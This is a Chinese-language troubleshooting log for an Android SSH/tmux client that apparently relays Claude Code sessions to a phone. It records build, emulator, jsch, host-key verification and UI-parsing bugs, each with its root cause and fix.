# TROUBLESHOOTING · Yxi

> 每条 = 症状 → 根因 → 修法。**只增不删**。
> **写新条目前先跑 `dev/ts-number.sh` 拿号**：四个 agent 同时往这儿追加，
> 号靠肉眼扫文件尾巴挑必然撞 —— 2026-09-07 一天撞三次，回头一查历史上还躺着四对（见 #317 那条的说法）。

## 1. `accounts.google.com` 直连超时，但 `dl.google.com` / `play.google.com` 通
- **症状**：服务器上 `curl https://accounts.google.com/` 卡住返回 000；同时 `dl.google.com` 正常 302。
- **根因**：出口网络对 Google 账号域名单独有阻断，非全站不可达。
- **修法**：走本机 sing-box。它的 inbound 是 **`mixed`** 类型（`/etc/sing-box/config.json`，`127.0.0.1:1080`），
  **HTTP 和 SOCKS5 都收** —— 所以 `curl -x http://127.0.0.1:1080` 和 `--socks5-hostname` 都能用。
  模拟器里用 `-http-proxy http://10.0.2.2:1080`（`10.0.2.2` = 模拟器视角的宿主机）。

## 2. `apkanalyzer` 报 `Cannot locate latest build tools`
- **症状**：`apkanalyzer apk summary x.apk` 抛 `IllegalStateException: Cannot locate latest build tools`。
- **根因**：它依赖 `$ANDROID_HOME/build-tools/<ver>/aapt2`，而 cmdline-tools 单独解压时 build-tools 还没装。
- **修法**：先 `sdkmanager "build-tools;34.0.0"`。**光有 cmdline-tools 不够。**

## 3. Moshi 的 `base.apk` 单独装不起来
- **症状**：微信收到的 `base.apk` 装上后一启动就崩。
- **根因**：它是 **split APK 的 base 部分**，`unzip -l` 数出 **0 个 `.so`**。而 Moshi 重度依赖原生
  （libghostty 终端引擎 / Nitro 传输层 / Parakeet ASR，见 PRD §2.2），缺 `split_config.<abi>.apk` 必崩。
- **修法**：① 模拟器用 `google_apis_playstore` 镜像从 Play 装（Play 自动处理 split，**官网确认安卓版只走 Play，无直接 APK 下载**）；
  ② 或手机装 [SAI](https://github.com/Aefyr/SAI) 导出完整 `.apks` → `adb install-multiple`。

## 4. Hermes 字节码里 `grep` 搜不到明明存在的字符串
- **症状**：`grep -oE 'https?://...' index.android.bundle` 返回空，但 `strings | grep` 有结果。
- **根因**：`.bundle` 是二进制，GNU grep 判定为 binary 后 `-o` 不输出。
- **修法**：**必须加 `-a`**（`grep -aoE`）。另外 Hermes 字符串表是**拼接存储**的（无分隔符），
  `strings` 会把相邻字符串串成一行 —— 要读上下文得按 offset 取字节，见 `dev/dig.py`。

## 5. 模拟器跑着跑着崩：`ERROR | Failed to find ColorBuffer: NN`
- **症状**：无 GUI 模拟器开机正常，一打开图片多的界面（应用商店的图标墙）就整个 qemu 进程死掉，
  `adb` 立刻变 `device offline` → `no devices/emulators found`。
- **根因**：软件渲染（gfxstream / swiftshader / lavapipe）在 **1080x2400** 这种大分辨率下渲染压力过大。
  **不是内存问题**（崩的时候还剩 11 G）。
- **修法**：把 AVD 降到 **720x1280 / density 320**（`hw.lcd.*`）并加 `-skin 720x1280`。降完就稳了。

## 6. `pkill -f 'qemu-system'` 把执行它的脚本自己杀了
- **症状**：脚本跑到 `pkill` 那行就整个退出，退出码 144，**一行输出都没有**。
- **根因**：`pkill -f` 匹配**完整命令行**，而当前 shell 的命令行里就含 `qemu-system` 这个字符串 → **自杀**。
  `pgrep -f` 同理，会把自己算进匹配结果，导致 `until ! pgrep -f X` 永远不退出。
- **修法**：模式里插方括号打断字面匹配：`pkill -f 'qemu-sys[t]em'`。

## 7. `set -euo pipefail` 误杀模拟器启动脚本
- **症状**：脚本直接退出，`/tmp/emulator.log` 内容还是上一次的（说明 nohup 那行压根没执行到）。
- **根因**：`until` 轮询、`adb wait-for-device` 等语句的中间退出码非 0，被 `set -e` 当成失败。
- **修法**：这类等待脚本**不要用 `set -e`**。

## 8. Aurora Store 匿名会话装不了某些应用：`App not supported`
- **症状**：Aurora 匿名登录成功、能打开应用页面，但点 Install 报 `App not supported`；
  页面上版本号显示 **`v (0)`**。
- **根因**：`v (0)` 是关键线索 —— **匿名会话拿不到该应用的完整元数据**（较新/受限的应用常见），
  于是 Aurora 自己的兼容性检查判定不支持。**不是 ABI 问题**：
  `ro.product.cpu.abilist` = `x86_64,arm64-v8a`，镜像自带 ARM 转译。
- **修法**：改用 Aurora 的 **Google 账号登录**；或在真机上用 [SAI](https://github.com/Aefyr/SAI) 导出完整 `.apks`。
  → 对本项目**价值不高**：原生库是 libghostty 和 Mosh 传输，两块我们都不抄（PRD §2.2）。

## 9. AGP 9 内置 Kotlin —— 再加 `kotlin.android` 插件会直接报错
- **症状**：`Failed to apply plugin 'org.jetbrains.kotlin.android'` →
  「The 'org.jetbrains.kotlin.android' plugin is no longer required for Kotlin support since AGP 9.0」
- **根因**：AGP 9.0 起 Kotlin 支持内置，旧教程里那句 `alias(libs.plugins.kotlin.android)` 现在是冲突。
- **修法**：删掉 `kotlin.android` 插件（根和 app 两处）。
  **`kotlin.plugin.compose` 要留着**（Compose 编译器仍是独立 Kotlin 插件）。
  同时 `kotlin { compilerOptions { jvmTarget … } }` 这个块也去掉，AGP 自己管。

## 10. `sourceSets["main"].kotlin.srcDirs(...)` 已废弃
- **症状**：先是 deprecation 警告，改成 `directories.add(file("..."))` 后报
  `Argument type mismatch: actual type is 'File', but 'String' was expected`。
- **修法**：`sourceSets["main"].kotlin.directories.add("src/main/kotlin")`——**收字符串，不是 `File`**。

## 11. AndroidX 2026.08 起要求 compileSdk 37
- **症状**：`checkDebugAarMetadata` 失败，一长串
  「Dependency 'androidx.compose.…:1.12.0' requires libraries and applications that
  depend on it to compile against version 37 or later」。
- **根因**：compose-bom 2026.08.00 / core-ktx 1.19.0 这批的 AAR 元数据要求 compileSdk ≥ 37。
- **修法**：`sdkmanager "platforms;android-37.0" "build-tools;37.0.0"`（⚠️ 包名是
  **`android-37.0`** 带小数点，不是 `android-37`），然后 compileSdk/targetSdk 都调 37。
  minSdk 保持 26 不受影响。

## 12. ⭐ Android 上 jsch 的 ed25519 认证必然失败 —— 除非注册 BouncyCastle
- **症状**：`JSchException: Auth fail for methods 'publickey,password'`。异常消息本身**什么也说明不了**。
- **诊断**：接上 jsch 自己的 logger（`JSch.setLogger`）才看到真话：
  ```
  Signature algorithms unavailable for non-agent identities = [ssh-ed25519, ssh-ed448]
  ssh-ed25519 not available for identity <名字>
  ```
- **根因**：**Android 的 JCA 不提供 `Ed25519` 签名算法**。jsch 内建的 ed25519 依赖
  JDK 15+ 的 JCA，安卓（API 34 实测）没有。
- **走过的弯路**：
  - 加 `net.i2p.crypto:eddsa` —— **没用**。jsch 查的算法名是 `Ed25519`，i2p 那个库注册的是 `EdDSA`/`NONEwithEdDSA`，对不上
  - 退回 ECDSA nistp256 —— 能用，但 ed25519 才是现在的默认，没必要退
- **修法**：注册 **BouncyCastle**（`org.bouncycastle:bcprov-jdk18on`），它正好用 `Ed25519` 这个名字：
  ```kotlin
  java.security.Security.removeProvider("BC")   // 先摘安卓自带的阉割版，否则算法查找命中旧的
  java.security.Security.insertProviderAt(BouncyCastleProvider(), 1)
  ```
  验证：日志变成 `ssh-ed25519 auth success` / `Authentication succeeded (publickey)`。
  代价：APK 从 12 MB 涨到 15 MB。

## 13. `NetworkOnMainThreadException` —— jsch 的写入必须自己切线程
- **症状**：认证成功、PTY 也开了，一往终端写字节就 `IOException: android.os.NetworkOnMainThreadException`。
- **根因**：Compose 的 `LaunchedEffect` 跑在主线程。jsch 的 `OutputStream.write` 是网络操作。
  读那边我用了 `withContext(Dispatchers.IO)` 所以没事，**写那边漏了**。
- **修法**：`Shell.write` / `resize` 一律 `suspend` + `withContext(Dispatchers.IO)`，
  别指望调用方记得切。

## 14. 模拟器在 gradle 构建时被挤死
- **症状**：构建跑着跑着 `adb: no devices/emulators found`，模拟器进程没了。不是 GPU 崩溃（#5 那种）。
- **根因**：**内存**。gradle 的 JVM 默认吃到 5 GB，加上模拟器 4 GB，机器 16 GB 还跑着
  VNC / Inspector / 多个 cc 会话 —— 可用只剩 4.9 GB 时模拟器被挤掉。
- **修法**：① `org.gradle.jvmargs=-Xmx2048m` + `org.gradle.parallel=false`（单模块并行无收益）
  ② 模拟器降到 `-memory 2048` ③ **先构建、构建完 `./gradlew --stop` 放掉守护进程内存，再拉模拟器**
  —— 已固化进 `dev/run.sh`。

## 15. 模拟器的 `-http-proxy` 会打断 SSH
- **症状**：SSH 握手和认证全部成功，数据流几百字节后
  `java.net.SocketException: Connection reset`。
- **根因**：当初为了登 Google Play 给模拟器加了 `-http-proxy http://10.0.2.2:1080`。
  **模拟器会把所有 TCP 都塞进那个 HTTP 代理**，而 sing-box 处理不了长连的 SSH 隧道。
- **修法**：`dev/avd.sh` 里 `PROXY` 默认留空，只有要登 Google 时才临时 `PROXY=... ./dev/avd.sh start`。

## 16. ⭐⭐ jsch 的 Session 写包路径**不是线程安全的**
- **症状**（两种表现，都极难定位）：
  - 服务器 `journalctl -u ssh` 里 `ssh_dispatch_run_fatal: … message authentication code incorrect`，随即杀连接
  - 或者通道**无声无息**关闭：客户端读到 EOF、`ch.connected=false`、没有任何异常、
    服务器日志也干净
- **诊断过程**（走了很多弯路，记下来省得重来）：
  1. 以为是 tmux 问题 → `ssh -tt 'tmux attach'` 从服务器手工跑，完全正常
  2. 以为是 `ChannelExec`+PTY 的问题 → 换 `ChannelShell`，还是断
  3. 以为是写得太早被 tty 冲掉 → 加就绪检测，还是断
  4. **把终端控件从数据通路上摘掉**（不调 `emulator.writeInput`）→ **通道稳如磐石**
  5. 恢复控件 + 打全量回调日志 → `控件 onResize -> 55x42` 之后紧跟着 EOF
- **根因**：终端控件的 `onResize` 从它自己的线程调 `setPtySize`，与读循环/`write`
  **并发写同一条 SSH 连接**，把包流写坏。MAC 错误和静默关闭是同一个根因的两种表现。
- **修法**：`Shell` 内部加 `Mutex`，`write` 和 `resize` 全部 `ioLock.withLock { … }` 串行化。
- **教训**：**「摘掉一个组件看还坏不坏」比继续猜有效得多**。前四步都在猜，第五步一刀切开。

## 17. jsch `ChannelExec` + `setPty(true)` 的输入流会提前 EOF
- **症状**：跑 `sleep 25` 这种长时间无输出的命令，只读到 13 字节就 `read() == -1`，
  而 `channel.isConnected` **仍然是 true**。
- **修法**：终端通道用 **`ChannelShell`**，别用 `ChannelExec`+PTY。
  `ChannelExec` 留给「跑一条命令拿输出就退」（`exec()`）。

## 18. 往刚开的 shell 里写命令会被冲掉
- **症状**：命令在终端里**回显了但没执行**，随后出现全新的提示符。
- **根因**：登录 shell（starship 那种）初始化要时间。在它开始读 stdin 之前写进去的字节
  被 tty 回显，然后被 shell 启动时的输入冲刷丢弃。
- **修法**：等第一批输出到达（表示 shell 在跑了）+ 一个静默间隔再写。
  更好的做法是根本别往终端里打配置命令——**开一条独立的 exec channel 去做**，
  终端的输入通道留给用户。

## 19. `run.sh` 里构建失败被管道吃掉
- **症状**：改了代码但行为没变，反复查不出原因——其实是**构建早就失败了**，
  脚本却拿着旧 APK 继续装。
- **根因**：`./gradlew … | grep … | tail` 之后 `$?` 是 `tail` 的退出码，**永远 0**。
- **修法**：`exit "${PIPESTATUS[0]}"`。

## 20. ed25519 私钥必须用 `writeOpenSSHv1PrivateKey`，不是 `writePrivateKey`
- **症状**：`KeyPair.genKeyPair(jsch, KeyPair.ED25519)` 之后调 `writePrivateKey()`
  抛 `UnsupportedOperationException`，**而且 message 是 null**——异常本身毫无信息量。
- **根因**：`writePrivateKey` 走的是传统 PEM 格式，**ed25519 只能用 OpenSSH v1 格式**。
- **修法**：`kp.writeOpenSSHv1PrivateKey(outputStream, null)`。读回用 `KeyPair.load` 即可（它认这个格式）。
- **另外**：`KeyPair.genKeyPair(…, ED25519)` **也需要先注册 BouncyCastle**（#12 只提到认证，
  其实生成同样需要）。所以把注册抽成了 `Crypto.ensureProviders()`，`KeyManager` 和
  `SshSession` 两边都调。

## 21. ⭐ `HostKey.getKey()` 返回的已经是 base64——再编码一次会让指纹校验彻底失效
- **症状**：每次连同一台主机都弹「第一次连这台主机」，**指纹变了却检测不出来**。
- **根因**：`HostKeyRepository.check()` 拿到的是**原始字节**，而 `add()` 里的
  `HostKey.getKey()` 返回的**已经是 base64 字符串**。我在 `add()` 里又 base64 了一次
  → 存的是双重编码，跟 `check()` 的单次编码永远对不上 → 永远 `NOT_INCLUDED`。
- **后果**：`CHANGED` 这条分支**永远走不到**。这不是显示瑕疵，**是中间人防护完全失效**。
- **修法**：`add()` 里直接存 `hostkey.key`。
- **怎么发现的**：故意篡改存下来的 hostKey 去试「应该被拒」，结果弹的是「第一次连」——
  **如果不专门测这个反向用例，这个洞会一直躺在那**。

## 22. ⭐ jsch 的 `StrictHostKeyChecking=ask` 在指纹**变了**时也会弹窗询问
- **症状**：篡改 hostKey 后连接，弹的是普通的「要不要信任」对话框；
  用户点「连」**就真连上了**。
- **根因**：我以为 `ask` 模式下 `CHANGED` 会被 jsch 直接拒绝——**错的**。
  它同样走 `UserInfo.promptYesNo()`。
- **后果**：社工一句「服务器刚重装过」就能骗过这道防线。
- **修法**：在 `promptYesNo()` 开头判断自己记的 `changedDetected` 标志，
  **为真就直接 return false，连问都不问**。真是重装了，让用户去主机列表显式删掉再重加——
  那是一个有意识的动作，不是随手点一下「确定」。

## 23. Kotlin 的块注释**可以嵌套**——注释里写 `/` 紧跟 `*` 会吃掉整个文件
- **症状**：`Syntax error: Unclosed comment`，报的行号是**文件最后一行 +1**，
  而那里什么都没有，完全看不出问题在哪。
- **根因**：文档注释里写了路径 `~/.cloud-status/` + `*.json`——中间的 `/` `*` 两个字符
  开了一个**嵌套块注释**。Kotlin 与 Java 不同，**块注释是可嵌套的**，
  于是后面的 `*/` 只闭合了内层，外层一路开到文件末尾。
- **怎么定位**：数一下 `/*` 和 `*/` 的出现次数，不相等就是它。
- **修法**：注释里别写这种路径，或者把通配符拆开写。

## 24. 抽出来的共用件忘了传参，失败长得跟真攻击一模一样
- **症状**：会话看板一连就报 `reject HostKey`，而终端界面连同一台主机完全正常。
- **根因**：我在会话看板里图省事写了 `KnownHosts(store, host.id, null)`——
  **prompt 传了 null**，于是「没见过这台主机」时无从询问，只能保守拒绝。
- **为什么值得记**：这个失败的表现**跟真的中间人攻击一模一样**。
  如果不是我自己刚写的代码，很可能会往"服务器被劫持了"的方向查。
- **修法**：把「连接 + 首次信任确认」抽成共用的 `rememberSshConnector`，
  终端和看板都用它。**凡是每个界面都要做一遍的安全动作，就该只有一份实现。**

## 25. ⭐ 抽了共用件却漏掉一个调用点——「给新主机装公钥」永远失败
- **症状**：主机列表里加一台新机（只填了密码），点「装公钥」→ 报 `reject HostKey`。
  **这个失败长得跟真的中间人攻击一模一样。**
- **根因**：`InstallKeySheet` 自己 `KnownHosts(store, host.id, null)` + `SshSession(...)`，
  prompt 传 `null`。新主机 `check()` 返回 `NOT_INCLUDED` → jsch 问 `promptYesNo` →
  没有 UI 可问 → 保守拒绝。#24 修的是会话看板那处，**这一处漏了**。
- **为什么会漏**：装公钥要用**密码**认证（公钥还没装上去），而 `rememberSshConnector`
  只会用主机存着的认证方式 —— 于是「它满足不了我的需求」成了绕开它的理由。
- **修法**：把认证覆盖做成共用入口的**参数**（`connect(Auth.Password(pw))`），
  让 UI 层**没有任何理由**自己 `new SshSession`。改完 `grep -rn "SshSession("` 在 ui/ 和 term/ 下
  只剩 connector 自己那一处 —— 这条 grep 就是防线。
- **教训**：抽共用件的时候要问「有没有哪个调用点因为需求不同而绕开它」，
  **绕开的那个就是下一个洞**。抽完立刻 grep 一遍原始构造函数。

## 26. ⭐ 绿的测试在没见它红过之前不算数
- **背景**：#21 #22 两个安全洞**正向用例全绿时都静静躺着**，只有专门测「应该失败」才露出来。
  补了 `KnownHostsTest`（5 条，仪器测试，因为依赖 `android.util.Base64`）之后，
  第一次跑就全绿 —— 但这**什么也没证明**。
- **做法**：把两个洞**按原样 sed 回去**再跑：
  `记住之后同一把钥匙必须OK` 报 `expected:<0> but was:<2>`、`指纹变了连问都不问直接拒` 失败。
  确认断言真的在扛事，再 `cp` 回来复绿。
- **顺带更正 #21 的一句话**：双重编码后 `check()` 实际返回的是 **`CHANGED`(2)** 而不是
  `NOT_INCLUDED`(1)。当时看到的「每次都弹第一次连这台主机」是 **#22 叠加造成的**——
  信任弹窗的文案写死了「第一次连」，CHANGED 走到同一个弹窗，从界面上根本分不出来。
  两个洞叠在一起互相掩护，这也是为什么单看现象定位不到。
- **命令**：`./gradlew connectedDebugAndroidTest`（要有设备/模拟器）。

## 27. 表单标签「主机名 / IP」在邀请用户填 SSH 别名
- **症状**：真机上用密码连，报 `JSchException: java.net.UnknownHostException: 天亮`。
  「天亮」是用户给这台机起的**别名**。
- **根因**：代码没错（`jsch.getSession(cfg.username, cfg.hostname, cfg.port)` 用的是 hostname），
  是**标签在误导**：「主机名」这个词让人以为可以填 `~/.ssh/config` 里的别名。
  手机上没有 `~/.ssh/config`，别名不解析。
- **修法**：标签改成「IP 或域名，如 38.244.50.31」；别名那栏改成「随便起，只给你自己看」。
  另外把异常翻译集中到 `Connector.explain()`：`UnknownHostException` 直接告诉用户
  「这一栏要填 IP 或真实域名，SSH 别名在这儿用不了」。
- **教训**：**能被误填的字段，标签就得写成没法误填的样子**；报错要说「怎么办」不是说「是什么」。

## 28. ⭐⭐ 待答的 `tool_use` **不落转录** —— 「此刻在等你」只能抓屏幕
- **背景**：G6 原计划从转录 JSONL 里读 `AskUserQuestion` 渲染成可点选项。
- **实测**：起一个会话让它问问题，**问题挂在屏幕上等着**，同时去看转录文件 ——
  用户那条消息在，**assistant 那条（含 `tool_use`）不在**。回答之后才一起写进去。
  也就是说「有个问题正等着你」这段时间，转录里什么都没有。
- **根因**：Claude Code 把 assistant 消息**缓冲到工具跑完**才落盘。
- **结论**：**转录是权威的历史，屏幕是唯一的「此刻」。** 两条路分工，不是二选一：
  历史读 `~/.claude/projects/**.jsonl`，待答抓 `tmux capture-pane`。
- **顺带的好处**（比正确性更重要的一点）：屏幕上写着几号就送几号。
  要是改成「从 JSON 读选项、按下标送键」，一旦两边顺序对不上就会**点 A 选中 B 且不报错**。
  **屏幕上的数字就是契约。**

## 29. Claude Code TUI 选择器的按键协议（实测，不是猜的）
起一个 tmux 会话跑 `claude`，用 `tmux send-keys` 逐个试出来的：

| 场景 | 按键 |
|---|---|
| 单选（AskUserQuestion / 信任目录 / 计划批准） | **送数字 → 直接选中并确认**，不用再送 Enter |
| 多选 | 数字 = **切换勾选**；`Right` 跳到 Submit 页；再送 `1` 才算提交 |
| 多个问题 | `Left` / `Right` 在问题标签之间切换 |
| 通用导航 | `Up` / `Down` / `j` / `k`；`Esc` 取消 |
| 多选时的 Enter | **是切换勾选，不是提交** —— 我一开始按常识以为是提交，错的 |

选项最多 4 个 + `Type something` + `Chat about this` = 6，**数字永远是一位**。
`Type something` 也能点：送数字后 TUI 开文本框，接着走正常的 `send-keys -l 文本` + `Enter` 就能填。

## 30. 屏幕上的编号列表会被误认成选项 —— 靠「编号连续到 1」而不是「离脚注多近」
- **症状**：ExitPlanMode 的批准框解析出来，标题是空的、选项数不对。
- **根因**：计划正文本身就是 `1. 烧水 / 2. 下面 / 3. 出锅`，**就贴在选择器上面**。
  一开始的规则是「取脚注上面 30 行里所有编号行」，把计划正文一起收进去了。
- **后果**：用户点第 3 项，送出去的 `3` 落到真选项的第 3 个上 —— **点 A 选中 B，而且不报错**。
- **修法**：从脚注**往上**收，编号必须 **连续递减到 1**，断了就停。
  真选项永远是紧贴脚注的那一组 1..N。
- **教训**：距离是启发式，结构才是规则。**能悄悄选错的地方，宁可规则严一点。**

## 31. 模拟器上 `adb install -r` 之后 App 数据没了（主机列表、密钥全丢）
- **症状**：每次重装完打开都是「还没有主机」，而且 App 的公钥变了（服务器上刚加的
  `authorized_keys` 立刻失效），报「认证被拒」。
- **影响**：每轮验证都要重新走一遍加主机的 UI，用 `adb shell input text` 一格格填，很慢。
- **绕法**：**别用 UI 填，直接塞文件**（debug 包可以 `run-as`）：
  ```
  adb push hosts.json /data/local/tmp/
  adb shell run-as app.yxi cp /data/local/tmp/hosts.json files/hosts.json
  ```
  `hostKey` 字段先用 `ssh-keyscan -t ed25519 <ip> | awk '{print $3}'` 填好，
  连的时候就不弹指纹确认了（顺带又验证了一次 known_hosts 的编码是对的）。
  公钥则每次重装后重新取一遍：`adb logcat -d -s YxiKey | grep -o 'pub=[A-Za-z0-9+/=]*'`。
- ⚠️ `adb shell run-as app.yxi sh -c '...'` 里的重定向会以 `/` 为工作目录，
  要用 `run-as app.yxi cp` 这种直接形式。

## 32. 「漏传 modifier」第三次出现了 —— 这次是文件查看器被状态栏压住
- **症状**：从文件列表点进一个文件，标题栏和状态栏叠在一起。
- **根因**：`FilesScreen` 把 `modifier`（里面有 Scaffold 的系统栏边距）用在了自己的 Column 上，
  但 `open?.let { FileViewer(...) }` 这条早退分支**没往下传**。
- **同一个形状已经出现三次**：#24（会话看板漏传 trust prompt）、#25（装公钥漏传 prompt）、这次。
  **凡是「每个调用点都要传一遍」的东西，就会有人漏传。**
- **怎么早点发现**：写完早退分支（`?.let { ...; return }`）回头看一眼参数表，
  外层用到的东西是不是都传下去了。这类分支最容易漏，因为它绕过了下面的主体。

## 33. `/tmp` 有 433 项 —— 靠滚是找不到东西的
- **症状**：文件模式做完，去 station 的 `/tmp` 找测试文件，滚了半天找不到。
- **根因**：不是 bug，是**功能缺了一块**。目标里本来就写着「直接输入路径」，我先只做了树形浏览。
- **修法**：面包屑末尾加一个 ⌖，弹框里可以直接敲路径（支持 `~`，走 SFTP 的 `realpath` 解析），
  另外记住最近去过的 8 个目录。**收藏没做** —— 那要落盘，等有真需求再说。
- **教训**：**目录浏览器在真实机器上的第一个障碍不是功能而是数量。** 演示目录都很小，
  真机上随便一个 `/tmp` 就几百项。

## 34. 语法高亮把 markdown 的 `#` 当成了注释符
- **症状**：md 源码模式下，`# 标题` 整行变灰。凑巧好看，但 `见 https://x/#anchor` 也会从 `#` 起灰掉。
- **根因**：注释符按扩展名分派时，默认返回了 `listOf("//", "#")`（"两种都认，认错顶多少上点色"），
  md 落进了默认分支。
- **修法**：`md` / `txt` / `csv` / `log` 明确返回**空**注释符列表。
- **教训**：「宽松一点没坏处」的默认值，**在它不该生效的类型上就是坏处**。

## 35. ⭐⭐ 节流没有「尾随刷新」—— 忙的会话正常，闲的会话永远空白
- **症状**：对话模式在有些会话里正常，有些会话**永远是 0 条**。服务器上 `tail -n 800 -f` 明明在跑，
  转录文件里也确实有内容。
- **根因**：解析做了节流「距上次超过 250ms 才重新解析」。而 `tail` 是**一次性把历史吐完**的：
  33 行全落在同一个 250ms 窗口里，**只有第一行触发了解析**（那行还是 `system` 类型，解出 0 条），
  剩下 32 行被吞掉，然后 tail 阻塞等新内容 —— 界面就永远停在第一行的解析结果上。
- **为什么难查**：**活跃的会话完全正常**（我一直在往里写，新行不断触发重解），
  只有闲着的会话才空白。这种「看起来偶发」的现象最容易被归到网络或时序上去。
- **修法**：节流一律要有尾随刷新。收行的只管 `buf += line; dirty = true`，
  另起一个协程每 300ms 把脏的刷出来（拷一份再丢到 `Dispatchers.Default` 解析，别在主线程解 800 行）。
- **教训**：**凡是「攒一批再处理」，都要问一句「最后那批谁来收」。** 丢的永远是最后一批，
  而最后一批往往就是全部。

## 36. `projectDirOf` 只把斜杠换成横杠不够 —— 非字母数字**全部**变横杠
- **症状**：中文路径的会话（`/opt/workspace/日常对话`）永远「没找到转录」。
- **根因**：Claude Code 的项目目录名规则是**凡不是 ASCII 字母数字的字符一律换成 `-`**，
  不只是斜杠。实测本机存在 `-opt-workspace-----`（`/opt/workspace/日常对话`，四个汉字四个横杠），
  没有任何带中文的目录名。点号、空格、连字符同理。
- **修法**：`cwd.map { if (它是 ASCII 字母或数字) 它 else '-' }`。
  ⚠️ 别用 Kotlin 的 `isLetterOrDigit()` —— **汉字在它眼里是字母**，会原样留下。
- 有测试盯着（`TranscriptTest.项目目录名`），断言里写的是实测到的真实目录名。

## 37. D-Pad 长按能用、快点没反应 —— 「按下发一次」不能放进 LaunchedEffect
- **症状**：压住方向键能连续走，**快速点一下完全没反应**。
- **根因**：把「按下立刻发一次」写在了 `LaunchedEffect(held)` 里。按下和抬起如果落在同一帧，
  `held` 已经变回 null，effect 还没轮到跑第一次 `send`。
- **修法**：第一下**在手势回调里直接发**，`LaunchedEffect` 只负责之后的连发；
  手指推到另一个方向时同样在回调里立刻补一发、并重启连发计时。
- **教训**：**「立即」的事情不要交给 effect。** effect 的执行时机由重组决定，
  而手势的生命周期比一帧还短。用起来的感觉是「有时候不灵」，最难查。

## 38. `pointerInput(Unit)` 抓的是**第一次组合时**的那个 lambda
- 手势里要调用外面传进来的回调，得先 `rememberUpdatedState(callback)` 再用，
  否则一直用的是初次组合那份闭包。这次没炸只是因为闭包读的是 `MutableState`，
  但只要哪天回调换了实现就会静默失效。

## 39. 「记住每会话偏好」把「开终端」按钮压没了
- **症状**：点「开终端」进去却是对话模式。
- **根因**：工作区一律用记住的偏好覆盖传进来的初始模式。
- **修法**：**显式动作压过记忆** —— 点「开终端」「文件」传具体模式，
  点会话卡片传 null（那才是「打开这个会话」而不是「我要某个模式」）。
- **教训**：记忆类功能要想清楚**它该压过谁**。压过显式点击就等于把按钮做废了。

## 40. 测试纪律：别往不是自己的 tmux 会话里打字
- **经过**：会话看板每 5 秒刷一次并重排，我截图定位好坐标、`adb shell input tap` 落下时
  列表已经变了 —— 点进了别人的会话，还往里 `input text` 了一行测试命令。
- **后果**：这次侥幸没造成影响（那行字没进输入框，也没发回车），但**这是运气不是设计**。
- **纪律**：① 测试只用**自己起的** `cc-probe` 之类的会话；② 往终端里打字前先确认标题栏；
  ③ 定位靠内容不靠坐标 —— 坐标会过期。
- 顺带：这也是个**真实的可用性问题** —— 看板在用户手指落下前重排，点错的不只是我。

## 41. 重连要多久：分解出来才知道该不该优化
- **目标写的是「切网后两秒内恢复」，实测 2.9–3.4 秒**（模拟器，掐断 → tmux 重新 attach）。
- **分解**：掐断 → 新 TCP 建立 **0.69 秒**（含看门狗 600ms 轮询）；剩下 ~2.2 秒是
  SSH 握手 + ed25519 认证 + 开 shell + 登录 shell 出提示符。
  服务器侧基准：`bash -lic true` 只要 0.25 秒，**所以瓶颈不在登录 shell**，
  在模拟器的软件加密（x86 翻译执行）。真机大概率更快，但**「应该会快」不能当验收**。
- **两个不该做的优化**：
  - 把心跳调到 1 秒以下 → 弱网 RTT 抖一下就**误杀一条还活着的连接**，正在跑的命令白跑。
  - 用 `ChannelExec + PTY` 直接跑 `tmux attach` 绕开登录 shell → 撞 #17（空闲时提前 EOF）。
- **做了的**：重连时跳过 tmux 的建会话/设选项那次往返（那些早就设过了）。
- **真正重要的那半是「光标位置不丢」，这个是满分**：重连后 `tmux attach` 把整屏原样带回来，
  连之前的回滚都在。**这是 tmux 白送的，不是我们实现的** —— 也正因如此，
  不针对 tmux 会话的裸终端重连后内容就是会丢，那是 SSH 的性质。

## 42. 固定的「等它就绪」延时，两头都不讨好 —— 改成等它安静下来
- **背景**：连上 shell 之后不能立刻写 `tmux attach`（#18：登录 shell 初始化期间写进去的字节
  会被 tty 回显后冲掉，现象是命令回显了却没执行）。原来的写法是死等 900ms。
- **问题**：快的机器白等 900ms（重连慢一截），慢的机器 900ms 还不够（踩回 #18）。
- **修法**：**等它安静** —— 记录最后一次收到输出的时刻，输出停了 250ms 就认为就绪
  （上限 3 秒兜底）。快的机器 ~0.4 秒走完，慢的机器自动多等。
- **教训**：**固定延时是在赌对面的速度。** 能观察到「完成」的信号就别赌 ——
  这里的信号就是「输出停了」。

## 43. `cd android` 之后又用相对路径装包 —— 静默装了个旧包，白查半小时
- **症状**：加了日志、重新构建、重新安装，**logcat 里一条新日志都没有**。
  于是开始怀疑服务没起、`Log` 被过滤、tag 太长…… 全是错的方向。
- **根因**：命令是 `cd android && ./gradlew … ; adb install -r android/app/build/…`。
  `cd` 之后那个相对路径不存在了，而我把 install 的输出 `>/dev/null 2>&1` 吞掉了，
  **失败完全看不见**，跑的还是上一版 APK。
- **修法**：装包一律用绝对路径（`"$PWD/android/app/build/..."`），
  而且**别把 install 的输出吞掉** —— 它就一行，留着。
- **教训**：`>/dev/null 2>&1` 吞掉的不只是噪音，还有「这一步根本没成功」。
  这和 TROUBLESHOOTING #19（`$?` 拿的是管道最后一个命令的退出码）是同一类错误：
  **把失败藏起来，然后去别处找原因。**

## 44. 模拟器重装清数据，把重建现场做成脚本（`dev/seed.sh`）
- 每次 `adb install -r` 之后：主机列表没了、App 的密钥重新生成（服务器上的
  `authorized_keys` 立刻失效）。手工重来一遍要点十几下 UI，我重复了十几次才去写脚本。
- `dev/seed.sh` 一条命令做完：取公钥 → 装进本机和 station 的 authorized_keys →
  用 `ssh-keyscan` 拿主机指纹预置进 hosts.json（连指纹确认框都省了）→ 重启 App。
- **教训**：**同一段手工操作做到第三遍就该写脚本了**，我做到了第十几遍。

## 45. 后台盯梢连一台**没装 hook** 的机器会陷入无限重连
- **症状**：某台机器的盯梢一直连不上，日志里反复「连上了 → 断了」。
- **根因**：`tail -n 300 -f ~/.yxi/events.jsonl` 在**没装 yxi-hook 的机器上没有那个目录**，
  `touch` 失败 → tail 起不来 → 通道立刻 EOF → 退避重连 → 每次都要完整握手 + 认证一遍。
- **修法**：命令前面加 `mkdir -p $HOME/.yxi`。建好之后它就只是**一条永远没有内容的流** ——
  正是「没装就静悄悄」该有的样子。
- **教训**：**「优雅降级」不会自己发生**。我在 `Host.watch` 的注释里写着「没装就一直静悄悄，
  不会报错」，但代码里并没有实现那句话 —— 注释写的是意图，不是事实。

## 46. ⭐⭐ 权限提示的脚注**没有 `to navigate`** —— 最该认出来的一种，一开始完全认不出来
- **症状**：G6 的「等你选」卡片对 `AskUserQuestion` 有效，对**权限提示**完全没反应。
